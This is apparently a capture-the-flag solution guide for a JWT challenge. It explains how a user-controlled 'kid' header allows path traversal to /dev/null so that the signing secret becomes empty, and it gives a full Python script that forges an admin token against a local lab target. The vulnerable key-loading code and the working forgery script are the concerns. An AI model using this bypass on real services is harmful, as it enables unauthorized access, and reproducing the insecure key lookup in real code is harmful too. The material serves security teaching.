# A04 Easy: Solution Guide

### Vulnerability Analysis
In `app.py`:
```python
unverified_header = jwt.get_unverified_header(token)
kid = unverified_header.get("kid", "server_secret.key")
key_path = os.path.join(KEYS_DIR, kid)
with open(key_path, "r") as f:
    secret = f.read().strip()
decoded = jwt.decode(token, secret, algorithms=["HS256"])
```

The application accepts user-controlled `kid` values and concatenates them into `key_path`. By specifying `../../../../dev/null`, the secret read by `f.read().strip()` becomes an empty string `""`.
Alternatively, referencing `../../../../proc/sys/kernel/domainname` yields `"(none)"`.

### Exploitation Script
```python
import jwt
import datetime
import requests

TARGET = "http://127.0.0.1:6010"

# Craft administrative payload
payload = {
    "user": "redteam_admin",
    "role": "admin",
    "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=2)
}

# Sign using empty secret with kid pointing to /dev/null
forged_jwt = jwt.encode(
    payload,
    key="",
    algorithm="HS256",
    headers={"kid": "../../../../../dev/null"}
)

r = requests.get(TARGET, cookies={"auth_session": forged_jwt})
print(r.text)
```
